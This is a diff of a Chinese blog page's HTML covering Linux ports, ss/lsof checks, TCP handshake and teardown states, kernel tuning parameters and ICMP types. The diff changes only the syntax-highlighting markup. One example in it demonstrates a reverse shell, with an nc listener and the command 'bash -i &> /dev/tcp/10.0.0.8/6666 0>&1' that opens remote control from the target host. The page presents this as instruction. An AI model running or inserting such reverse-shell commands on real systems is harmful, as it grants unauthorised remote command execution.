@@ -342,50 +342,22 @@
 <li>49152-65535：动态或私有端口，客户端随机使用端口，范围定义：&#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_local_port_range</li>
 </ul>
 <p>&#x2F;etc&#x2F;services 这个文件记录了常用的服务对应的端口号</p>
-<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@centos8 ~<span class="token punctuation">]</span><span class="token comment"># cat /etc/services | grep mysql</span>
-mysql           <span class="token number">3306</span>/tcp                        <span class="token comment"># MySQL</span>
-mysql           <span class="token number">3306</span>/udp                        <span class="token comment"># MySQL</span>
-mysql-cluster   <span class="token number">1186</span>/tcp                <span class="token comment"># MySQL Cluster Manager</span>
-mysql-cluster   <span class="token number">1186</span>/udp                <span class="token comment"># MySQL Cluster Manager</span>
-mysql-cm-agent  <span class="token number">1862</span>/tcp                <span class="token comment"># MySQL Cluster Manager Agent</span>
-mysql-cm-agent  <span class="token number">1862</span>/udp                <span class="token comment"># MySQL Cluster Manager Agent</span>
-mysql-im        <span class="token number">2273</span>/tcp                <span class="token comment"># MySQL Instance Manager</span>
-mysql-im        <span class="token number">2273</span>/udp                <span class="token comment"># MySQL Instance Manager</span>
-mysql-proxy     <span class="token number">6446</span>/tcp                <span class="token comment"># MySQL Proxy</span>
-mysql-proxy     <span class="token number">6446</span>/udp                <span class="token comment"># MySQL Proxy</span>
-mysqlx          <span class="token number">33060</span>/tcp               <span class="token comment"># MySQL Database Extended Interface</span></code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@centos8 ~]<span class="comment"># cat /etc/services | grep mysql</span></span><br><span class="line">mysql           3306/tcp                        <span class="comment"># MySQL</span></span><br><span class="line">mysql           3306/udp                        <span class="comment"># MySQL</span></span><br><span class="line">mysql-cluster   1186/tcp                <span class="comment"># MySQL Cluster Manager</span></span><br><span class="line">mysql-cluster   1186/udp                <span class="comment"># MySQL Cluster Manager</span></span><br><span class="line">mysql-cm-agent  1862/tcp                <span class="comment"># MySQL Cluster Manager Agent</span></span><br><span class="line">mysql-cm-agent  1862/udp                <span class="comment"># MySQL Cluster Manager Agent</span></span><br><span class="line">mysql-im        2273/tcp                <span class="comment"># MySQL Instance Manager</span></span><br><span class="line">mysql-im        2273/udp                <span class="comment"># MySQL Instance Manager</span></span><br><span class="line">mysql-proxy     6446/tcp                <span class="comment"># MySQL Proxy</span></span><br><span class="line">mysql-proxy     6446/udp                <span class="comment"># MySQL Proxy</span></span><br><span class="line">mysqlx          33060/tcp               <span class="comment"># MySQL Database Extended Interface</span></span><br></pre></td></tr></table></figure>
 
 <p>范例：找到端口冲突的应用程序</p>
-<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># ss命令查看套接字，找到冲突的端口号，l参数表示查看被占用（监听）的端口号</span>
-ss <span class="token parameter variable">-ntl</span>
-<span class="token comment">## p参数可以看到占用该端口的进程</span>
-ss <span class="token parameter variable">-ntlp</span>
-<span class="token comment">## 或者使用lsof能查看更详细的进程信息</span>
-<span class="token function">lsof</span> <span class="token parameter variable">-i</span> :port</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ss命令查看套接字，找到冲突的端口号，l参数表示查看被占用（监听）的端口号</span></span><br><span class="line">ss -ntl</span><br><span class="line"><span class="comment">## p参数可以看到占用该端口的进程</span></span><br><span class="line">ss -ntlp</span><br><span class="line"><span class="comment">## 或者使用lsof能查看更详细的进程信息</span></span><br><span class="line">lsof -i :port</span><br></pre></td></tr></table></figure>
 
 <p>范例：判断端口是否被占用，除了使用 ss，还以用以下方式</p>
-<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@4710419222 ~<span class="token punctuation">]</span><span class="token comment"># &lt; /dev/tcp/127.0.0.1/9501</span>
-<span class="token punctuation">[</span>root@4710419222 ~<span class="token punctuation">]</span><span class="token comment"># echo $?</span>
-<span class="token number">0</span></code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@4710419222 ~]<span class="comment"># &lt; /dev/tcp/127.0.0.1/9501</span></span><br><span class="line">[root@4710419222 ~]<span class="comment"># echo $?</span></span><br><span class="line">0</span><br></pre></td></tr></table></figure>
 
 <p>范例：反弹 shell 实现远程控制</p>
-<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#在控制机监听打开端口</span>
-<span class="token punctuation">[</span>root@centos8 ~<span class="token punctuation">]</span><span class="token comment">#dnf -y install nc</span>
-<span class="token punctuation">[</span>root@centos8 ~<span class="token punctuation">]</span><span class="token comment">#nc -lvp 6666</span>
-Ncat: Version <span class="token number">7.70</span> <span class="token punctuation">(</span> https://nmap.org/ncat <span class="token punctuation">)</span>
-Ncat: Listening on :::6666
-Ncat: Listening on <span class="token number">0.0</span>.0.0:6666
-<span class="token comment">#在被控制机上实现反弹shell</span>
-<span class="token punctuation">[</span>root@centos7 ~<span class="token punctuation">]</span><span class="token comment">#bash -i &amp;> /dev/tcp/10.0.0.8/6666 0>&amp;1</span>
-<span class="token comment">#在控制机主机可以观察到以下信息，自动登录到被控制主机，且可以执行命令</span></code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#在控制机监听打开端口</span></span><br><span class="line">[root@centos8 ~]<span class="comment">#dnf -y install nc</span></span><br><span class="line">[root@centos8 ~]<span class="comment">#nc -lvp 6666</span></span><br><span class="line">Ncat: Version 7.70 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::6666</span><br><span class="line">Ncat: Listening on 0.0.0.0:6666</span><br><span class="line"><span class="comment">#在被控制机上实现反弹shell</span></span><br><span class="line">[root@centos7 ~]<span class="comment">#bash -i &amp;&gt; /dev/tcp/10.0.0.8/6666 0&gt;&amp;1</span></span><br><span class="line"><span class="comment">#在控制机主机可以观察到以下信息，自动登录到被控制主机，且可以执行命令</span></span><br></pre></td></tr></table></figure>
 
 <h3 id="TCP-三次握手"><a href="#TCP-三次握手" class="headerlink" title="TCP 三次握手"></a>TCP 三次握手</h3><p>以下 主动方 是 主动握手方，被动方 是 被动握手方</p>
 <p><img data-src="//img.to2b.cn/blog/ljk/1613529950598.png"></p>
 <p>再说一遍：SYN 是<strong>同步位</strong>，要求建立同步连接。ACK 是<strong>确认位</strong>，确保现在的连接是有效的（确保 seq、next seq、ack 等数据是有效的）</p>
 <p>第一次握手：主动方 —&gt; 被动方，SYN&#x3D;1，ACK&#x3D;0<br>第二次握手：被动方 —&gt; 主动方，SYN&#x3D;1，ACK&#x3D;1<br>第三次握手：主动方 —&gt; 被动方，SYN&#x3D;0，ACK&#x3D;1，之后的通信确保 ACK 位一直为 1</p>
-<h4 id="三次握手过程中-seq-和-ack"><a href="#三次握手过程中-seq-和-ack" class="headerlink" title="三次握手过程中 seq 和 ack"></a>三次握手过程中 seq 和 ack</h4><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">seq</span>			<span class="token comment"># 我当前的位置</span>
-next <span class="token function">seq</span>	<span class="token comment"># 我下一步准备去的位置，注意：只有确认对方成功收到这条报文，才真的去这个位置，那如何确认呢？只要下一条返回的报文的ack等于next seq，就确认了</span>
-ack			<span class="token comment"># 确认对方位置，并希望对方下次从这个位置开始发送信息</span></code></pre>
+<h4 id="三次握手过程中-seq-和-ack"><a href="#三次握手过程中-seq-和-ack" class="headerlink" title="三次握手过程中 seq 和 ack"></a>三次握手过程中 seq 和 ack</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">seq</span>			<span class="comment"># 我当前的位置</span></span><br><span class="line">next <span class="built_in">seq</span>	<span class="comment"># 我下一步准备去的位置，注意：只有确认对方成功收到这条报文，才真的去这个位置，那如何确认呢？只要下一条返回的报文的ack等于next seq，就确认了</span></span><br><span class="line">ack			<span class="comment"># 确认对方位置，并希望对方下次从这个位置开始发送信息</span></span><br></pre></td></tr></table></figure>
 
 <ol>
 <li><p>第一次握手：主动方 —&gt; 被动方：<code>seq=0，next seq=1，ack=0</code><br><font color=red>我在 0（seq&#x3D;0），你收到这条消息我就去 1（next seq&#x3D;1），你在 0 吗（ack&#x3D;0）</font></p>
@@ -402,21 +374,16 @@ ack			<span class="token comment"># 确认对方位置，并希望对方下次�
 <p>前 3 条报文互相没有发送任何数据，只是相互通知自己要去 1，同时确认对方也到 1</p>
 <h4 id="sync-半连接和-accept-全连接队列"><a href="#sync-半连接和-accept-全连接队列" class="headerlink" title="sync 半连接和 accept 全连接队列"></a>sync 半连接和 accept 全连接队列</h4><ul>
 <li><p>syns queue：第一次握手后，被动方把请求放到 syns queue（半连接队列、未完成连接队列），然后进入 SYN-RCVD 状态</p>
-<pre class="language-bash" data-language="bash"><code class="language-bash">/proc/sys/net/ipv4/tcp_max_syn_backlog   <span class="token comment">#半连接队列大小，默认值128,建议调整大小为1024以上</span></code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proc/sys/net/ipv4/tcp_max_syn_backlog   <span class="comment">#半连接队列大小，默认值128,建议调整大小为1024以上</span></span><br></pre></td></tr></table></figure>
 </li>
 <li><p>accept queue：最后一次握手后，从 syns queue 中拿出相关信息放到 accept queue(全连接队列、完成连接队列)，然后进入 ESTAB 状态</p>
-<pre class="language-bash" data-language="bash"><code class="language-bash">/proc/sys/net/core/somaxconn    <span class="token comment">#全连接队列大小，默认值128,建议调整大小为1024以上</span></code></pre></li>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proc/sys/net/core/somaxconn    <span class="comment">#全连接队列大小，默认值128,建议调整大小为1024以上</span></span><br></pre></td></tr></table></figure></li>
 </ul>
 <h4 id="三次握手过程中-TCP-状态"><a href="#三次握手过程中-TCP-状态" class="headerlink" title="三次握手过程中 TCP 状态"></a>三次握手过程中 TCP 状态</h4><p><strong>主动方：</strong></p>
-<pre class="language-bash" data-language="bash"><code class="language-bash">CLOSED			<span class="token comment"># 三次握手之前的状态</span>
-SYN-SENT		<span class="token comment"># 发送SYN=1的请求建立连接的报文后的状态</span>
-ESTAB-LISTEN	<span class="token comment"># 建立连接，开始传输数据，也可以只显示ESTAB</span></code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CLOSED			<span class="comment"># 三次握手之前的状态</span></span><br><span class="line">SYN-SENT		<span class="comment"># 发送SYN=1的请求建立连接的报文后的状态</span></span><br><span class="line">ESTAB-LISTEN	<span class="comment"># 建立连接，开始传输数据，也可以只显示ESTAB</span></span><br></pre></td></tr></table></figure>
 
 <p><strong>被动方：</strong></p>
-<pre class="language-bash" data-language="bash"><code class="language-bash">CLOSED			<span class="token comment"># 服务器还没有建立监听状态，此时无法处理客户端发送的请求，也就是无法进行三次握手</span>
-LISTEN			<span class="token comment"># 建立监听状态，例如启动nginx后，才会监听80端口，此时才能处理http请求</span>
-SYN-RCVD		<span class="token comment"># 第二次握手和第三次握手的间隙</span>
-ESTAB-LISTEN	<span class="token comment"># 建立连接，开始传输数据，也可以只显示ESTAB</span></code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CLOSED			<span class="comment"># 服务器还没有建立监听状态，此时无法处理客户端发送的请求，也就是无法进行三次握手</span></span><br><span class="line">LISTEN			<span class="comment"># 建立监听状态，例如启动nginx后，才会监听80端口，此时才能处理http请求</span></span><br><span class="line">SYN-RCVD		<span class="comment"># 第二次握手和第三次握手的间隙</span></span><br><span class="line">ESTAB-LISTEN	<span class="comment"># 建立连接，开始传输数据，也可以只显示ESTAB</span></span><br></pre></td></tr></table></figure>
 
 <h3 id="TCP-四次挥手"><a href="#TCP-四次挥手" class="headerlink" title="TCP 四次挥手"></a>TCP 四次挥手</h3><p>以下 主动方 是主动挥手方，被动方 是 被动挥手方</p>
 <p><img data-src="//img.to2b.cn/blog/ljk/1613529829069.png"></p>
@@ -436,8 +403,7 @@ ESTAB-LISTEN	<span class="token comment"># 建立连接，开始传输数据，�
 <li><p>FIN-WAIT-1：主动方发送 FIN&#x3D;1 请求断开连接请求，到被动方回复 ACK&#x3D;1，确认收到请求的这段时间</p>
 </li>
 <li><p>FIN-WAIT-2：确认被动方收到分手请求，到被动方发送最后一次数据的这段等待时间。处于 FIN_WAIT_2 状态的主动方需要等待被动方发送结束报文段，才能转移至 TIME_WAIT 状态，否则它将一直停留在这个状态。连接长时间地停留在 FIN_WAIT_2，可能会未等服务器关闭连接就强行退出了，此时客户端连接由内核来接管，可称之为孤儿连接（和孤儿进程类似）。<br>Linux 为了防止孤儿连接长时间存留在内核中，定义了两个内核参数：</p>
-<pre class="language-bash" data-language="bash"><code class="language-bash">/proc/sys/net/ipv4/tcp_max_orphans <span class="token comment">#指定内核能接管的孤儿连接数目</span>
-/proc/sys/net/ipv4/tcp_fin_timeout <span class="token comment">#指定孤儿连接在内核中生存的时间</span></code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/proc/sys/net/ipv4/tcp_max_orphans <span class="comment">#指定内核能接管的孤儿连接数目</span></span><br><span class="line">/proc/sys/net/ipv4/tcp_fin_timeout <span class="comment">#指定孤儿连接在内核中生存的时间</span></span><br></pre></td></tr></table></figure>
 </li>
 <li><p>TIME-WAIT：主动方发送完最后一次挥手后，保持这个状态，确保 tcp 连接不断开，时间是 2MSL，确保被动方第三次挥手发送失败可以重发。</p>
 <ul>
@@ -458,10 +424,7 @@ ESTAB-LISTEN	<span class="token comment"># 建立连接，开始传输数据，�
 </li>
 </ul>
 <p><strong>被动方：</strong></p>
-<pre class="language-bash" data-language="bash"><code class="language-bash">ESTAB-LISTEN	<span class="token comment"># 双方连接正常，也可以只显示ESTAB</span>
-CLOSE-WAIT		<span class="token comment"># 确认收到挥手请求，到发送最后一次数据传输中间的状态，即第二、三次挥手的中间状态</span>
-LAST-ACK		<span class="token comment"># 发送完最后一次数据传输，等待主动方最后的挥手，即第三、四次挥手的中间状态</span>
-CLOSED			<span class="token comment"># 彻底断开连接，可以重新建立连接了</span></code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ESTAB-LISTEN	<span class="comment"># 双方连接正常，也可以只显示ESTAB</span></span><br><span class="line">CLOSE-WAIT		<span class="comment"># 确认收到挥手请求，到发送最后一次数据传输中间的状态，即第二、三次挥手的中间状态</span></span><br><span class="line">LAST-ACK		<span class="comment"># 发送完最后一次数据传输，等待主动方最后的挥手，即第三、四次挥手的中间状态</span></span><br><span class="line">CLOSED			<span class="comment"># 彻底断开连接，可以重新建立连接了</span></span><br></pre></td></tr></table></figure>
 
 <h3 id="tcp-状态以及状态转换"><a href="#tcp-状态以及状态转换" class="headerlink" title="tcp 状态以及状态转换"></a>tcp 状态以及状态转换</h3><ol>
 <li>CLOSED：没有任何连接状态</li>
@@ -476,53 +439,13 @@ CLOSED			<span class="token comment"># 彻底断开连接，可以重新建立�
 <li>LAST-ACK：被动关闭,等待最后一个关闭传输连接确认，并等待所有分组消失</li>
 <li>CLOSING：双方同时尝试关闭传输连接，等待对方确认</li>
 </ol>
-<h3 id="tcp-超时重传"><a href="#tcp-超时重传" class="headerlink" title="tcp 超时重传"></a>tcp 超时重传</h3><pre class="language-bash" data-language="bash"><code class="language-bash">/proc/sys/net/ipv4/tcp_retries1 <span class="token comment">#指定在底层IP接管之前TCP最少执行的重传次数，默认值是3</span>
-/proc/sys/net/ipv4/tcp_retries2 <span class="token comment">#指定连接放弃前TCP最多可以执行的重传次数，默认值15（一般对应13～30min）</span></code></pre>
+<h3 id="tcp-超时重传"><a href="#tcp-超时重传" class="headerlink" title="tcp 超时重传"></a>tcp 超时重传</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/proc/sys/net/ipv4/tcp_retries1 <span class="comment">#指定在底层IP接管之前TCP最少执行的重传次数，默认值是3</span></span><br><span class="line">/proc/sys/net/ipv4/tcp_retries2 <span class="comment">#指定连接放弃前TCP最多可以执行的重传次数，默认值15（一般对应13～30min）</span></span><br></pre></td></tr></table></figure>
 
 <h3 id="拥塞控制"><a href="#拥塞控制" class="headerlink" title="拥塞控制"></a>拥塞控制</h3><p>当前所使用的拥塞控制算法</p>
-<pre class="language-none"><code class="language-none">&#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;tcp_congestion_control</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proc/sys/net/ipv4/tcp_congestion_control</span><br></pre></td></tr></table></figure>
 
 <h3 id="tcp-内核参数优化"><a href="#tcp-内核参数优化" class="headerlink" title="tcp 内核参数优化"></a>tcp 内核参数优化</h3><p>编辑文件&#x2F;etc&#x2F;sysctl.conf，加入以下内容：然后执行 sysctl -p 让参数生效。</p>
-<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 套接字由本端要求关闭，规定保持在FIN-WAIT-2状态的时间，默认值是60秒</span>
-net.ipv4.tcp_fin_timeout <span class="token operator">=</span> <span class="token number">2</span>
-
-<span class="token comment"># 提示：reuse和recycle这两个参数可以防止生产环境下Web、Squid等业务服务器time_wait网络状态数量过多</span>
-<span class="token comment"># 开启重用。允许将TIME-WAIT sockets重新用于新的TCP连接，默认0</span>
-net.ipv4.tcp_tw_reuse <span class="token operator">=</span> <span class="token number">1</span>
-<span class="token comment"># 开启TCP连接中TIME-WAIT sockets的快速回收，默认0</span>
-net.ipv4.tcp_tw_recycle <span class="token operator">=</span> <span class="token number">1</span>
-
-<span class="token comment"># 开启SYN Cookies功能。当出现SYN等待队列溢出时，启用Cookies来处理，可防范少量SYN攻击</span>
-net.ipv4.tcp_syncookies <span class="token operator">=</span> <span class="token number">1</span>
-
-<span class="token comment"># 当keepalive启用时，TCP发送keepalive消息的频率。单位秒</span>
-net.ipv4.tcp_keepalive_time <span class="token operator">=</span> <span class="token number">600</span>
-
-<span class="token comment"># 设定允许系统打开的端口范围，即用于向外连接的端口范围</span>
-net.ipv4.ip_local_port_range <span class="token operator">=</span> <span class="token number">2000</span> <span class="token number">65000</span>
-
-<span class="token comment"># SYN队列的长度，即半连接队列长度，默认为1024，建议加大队列的长度为8192或更多，这样可以容纳更多等待连接的网络连接数。 该参数为服务器端用于记录那些尚未收到客户端确认信息的连接请求最大值</span>
-net.ipv4.tcp_max_syn_backlog <span class="token operator">=</span> <span class="token number">16384</span>
-
-<span class="token comment"># 系统同时保持TIME_WAIT套接字的最大数量，如果超过这个数值，TIME_WAIT套接字将立刻被清除并打印警告信息。 默认为180000，对于Apache、Nginx等服务器来说可以将其调低一点，如改为5000~30000，避免因过多的TIME_WAIT套接字使Web服务器变慢</span>
-net.ipv4.tcp_max_tw_buckets <span class="token operator">=</span> <span class="token number">36000</span>
-
-<span class="token comment"># 路由缓存刷新频率，当一个路由失败后多长时间跳到另一个路由，默认是300</span>
-net.ipv4.route.gc_timeout <span class="token operator">=</span> <span class="token number">100</span>
-
-<span class="token comment"># 内核放弃连接之前发送SYN+ACK包的数量，默认5</span>
-net.ipv4.tcp_syn_retries <span class="token operator">=</span> <span class="token number">1</span>
-<span class="token comment"># 在内核放弃建立连接之前发送SYN包的数量，默认6</span>
-net.ipv4.tcp_synack_retries <span class="token operator">=</span> <span class="token number">1</span>
-
-<span class="token comment"># 系统所能处理不属于任何进程的TCP sockets最大数量（主动关闭端发送了FIN后转到FIN_WAIT_1，这时TCP连接就不属于某个进程了）。假如超过这个数量，那么不属于任何进程的连接会被立即reset，并同时显示警告信息。之所以要设定这个限制，纯粹为了抵御那些简单的 DoS 攻击﹐千万不要依赖这个或是人为的降低这个限制，默认8192</span>
-net.ipv4.tcp_max_orphans <span class="token operator">=</span> <span class="token number">16384</span>
-
-<span class="token comment"># 同时发起的TCP的最大连接数，即全连接队列长度，在高并发请求中，可能会导致链接超时或重传，一般结合并发请求数来调大此值，默认128</span>
-net.core.somaxconn <span class="token operator">=</span> <span class="token number">16384</span>
-
-<span class="token comment"># 当每个网络接口接收数据包的速率比内核处理这些包的速率快时，允许发送到队列的数据包最大数，默认1000</span>
-net.core.netdev_max_backlog <span class="token operator">=</span> <span class="token number">16384</span></code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 套接字由本端要求关闭，规定保持在FIN-WAIT-2状态的时间，默认值是60秒</span></span><br><span class="line">net.ipv4.tcp_fin_timeout = 2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提示：reuse和recycle这两个参数可以防止生产环境下Web、Squid等业务服务器time_wait网络状态数量过多</span></span><br><span class="line"><span class="comment"># 开启重用。允许将TIME-WAIT sockets重新用于新的TCP连接，默认0</span></span><br><span class="line">net.ipv4.tcp_tw_reuse = 1</span><br><span class="line"><span class="comment"># 开启TCP连接中TIME-WAIT sockets的快速回收，默认0</span></span><br><span class="line">net.ipv4.tcp_tw_recycle = 1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 开启SYN Cookies功能。当出现SYN等待队列溢出时，启用Cookies来处理，可防范少量SYN攻击</span></span><br><span class="line">net.ipv4.tcp_syncookies = 1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 当keepalive启用时，TCP发送keepalive消息的频率。单位秒</span></span><br><span class="line">net.ipv4.tcp_keepalive_time = 600</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设定允许系统打开的端口范围，即用于向外连接的端口范围</span></span><br><span class="line">net.ipv4.ip_local_port_range = 2000 65000</span><br><span class="line"></span><br><span class="line"><span class="comment"># SYN队列的长度，即半连接队列长度，默认为1024，建议加大队列的长度为8192或更多，这样可以容纳更多等待连接的网络连接数。 该参数为服务器端用于记录那些尚未收到客户端确认信息的连接请求最大值</span></span><br><span class="line">net.ipv4.tcp_max_syn_backlog = 16384</span><br><span class="line"></span><br><span class="line"><span class="comment"># 系统同时保持TIME_WAIT套接字的最大数量，如果超过这个数值，TIME_WAIT套接字将立刻被清除并打印警告信息。 默认为180000，对于Apache、Nginx等服务器来说可以将其调低一点，如改为5000~30000，避免因过多的TIME_WAIT套接字使Web服务器变慢</span></span><br><span class="line">net.ipv4.tcp_max_tw_buckets = 36000</span><br><span class="line"></span><br><span class="line"><span class="comment"># 路由缓存刷新频率，当一个路由失败后多长时间跳到另一个路由，默认是300</span></span><br><span class="line">net.ipv4.route.gc_timeout = 100</span><br><span class="line"></span><br><span class="line"><span class="comment"># 内核放弃连接之前发送SYN+ACK包的数量，默认5</span></span><br><span class="line">net.ipv4.tcp_syn_retries = 1</span><br><span class="line"><span class="comment"># 在内核放弃建立连接之前发送SYN包的数量，默认6</span></span><br><span class="line">net.ipv4.tcp_synack_retries = 1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 系统所能处理不属于任何进程的TCP sockets最大数量（主动关闭端发送了FIN后转到FIN_WAIT_1，这时TCP连接就不属于某个进程了）。假如超过这个数量，那么不属于任何进程的连接会被立即reset，并同时显示警告信息。之所以要设定这个限制，纯粹为了抵御那些简单的 DoS 攻击﹐千万不要依赖这个或是人为的降低这个限制，默认8192</span></span><br><span class="line">net.ipv4.tcp_max_orphans = 16384</span><br><span class="line"></span><br><span class="line"><span class="comment"># 同时发起的TCP的最大连接数，即全连接队列长度，在高并发请求中，可能会导致链接超时或重传，一般结合并发请求数来调大此值，默认128</span></span><br><span class="line">net.core.somaxconn = 16384</span><br><span class="line"></span><br><span class="line"><span class="comment"># 当每个网络接口接收数据包的速率比内核处理这些包的速率快时，允许发送到队列的数据包最大数，默认1000</span></span><br><span class="line">net.core.netdev_max_backlog = 16384</span><br></pre></td></tr></table></figure>
 
 <p>以上参数在 &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4 路径下</p>
 <h3 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h3><p>udp 包头结构</p>
@@ -539,19 +462,10 @@ net.core.netdev_max_backlog <span class="token operator">=</span> <span class="t
 </ul>
 <p>ICMP 协议是为了辅助 IP 协议而被制造出来，ICMP 分担完善了 IP 的一部分功能。<br>ICMP 的功能分为两类：<strong>差错通知</strong> 和 <strong>信息查询</strong>，具体由 8 位的类型字段决定，以下是具体各种功能：</p>
 <h4 id="目的不可达（Destination-Unreachable）"><a href="#目的不可达（Destination-Unreachable）" class="headerlink" title="目的不可达（Destination Unreachable）"></a>目的不可达（Destination Unreachable）</h4><p>type：destination-unreachable，3</p>
-<pre class="language-bash" data-language="bash"><code class="language-bash">code：0 - <span class="token number">15</span>
-
-<span class="token comment"># 0：目标网络不可达</span>
-<span class="token comment"># 1：目标主机不可达</span>
-<span class="token comment"># 2：目标协议不可达</span>
-<span class="token comment"># 3：目标端口不可达</span>
-<span class="token comment"># ...</span></code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">code：0 - 15</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0：目标网络不可达</span></span><br><span class="line"><span class="comment"># 1：目标主机不可达</span></span><br><span class="line"><span class="comment"># 2：目标协议不可达</span></span><br><span class="line"><span class="comment"># 3：目标端口不可达</span></span><br><span class="line"><span class="comment"># ...</span></span><br></pre></td></tr></table></figure>
 
 <h4 id="超时（Time-Exceeded）"><a href="#超时（Time-Exceeded）" class="headerlink" title="超时（Time Exceeded）"></a>超时（Time Exceeded）</h4><p>type：time-exceeded，11</p>
-<pre class="language-bash" data-language="bash"><code class="language-bash">code：0、1
-
-<span class="token comment"># 0：在数据报传输期间生存时间TTL为0；传输过程中超时</span>
-<span class="token comment"># 1：在数据报组装期间生存时间TTL为0；一个IP数据报可能会因为过大而被分片，然后在目的主机侧把所有的分片重组。如果主机迟迟没有等到所有的分片报文，就会向源发送方发送一个ICMP超时报文，Code为1，表示分片重组超时了</span></code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">code：0、1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0：在数据报传输期间生存时间TTL为0；传输过程中超时</span></span><br><span class="line"><span class="comment"># 1：在数据报组装期间生存时间TTL为0；一个IP数据报可能会因为过大而被分片，然后在目的主机侧把所有的分片重组。如果主机迟迟没有等到所有的分片报文，就会向源发送方发送一个ICMP超时报文，Code为1，表示分片重组超时了</span></span><br></pre></td></tr></table></figure>
 
 <h4 id="参数错误报文（Parameter-Problem）"><a href="#参数错误报文（Parameter-Problem）" class="headerlink" title="参数错误报文（Parameter Problem）"></a>参数错误报文（Parameter Problem）</h4><p>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</p>
 <p>| Type | Code | Checksum |</p>
@@ -561,20 +475,12 @@ net.core.netdev_max_backlog <span class="token operator">=</span> <span class="t
 <p>| Internet Header + 64 bits of Original Data Datagram |</p>
 <p>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</p>
 <p>type：parameter-problem，12</p>
-<pre class="language-bash" data-language="bash"><code class="language-bash">code：0、1
-
-<span class="token comment"># 0：IP数据报头的参数错误，Pointer表示错误的字节位置</span>
-<span class="token comment"># 1：缺少必需的选项</span></code></pre>
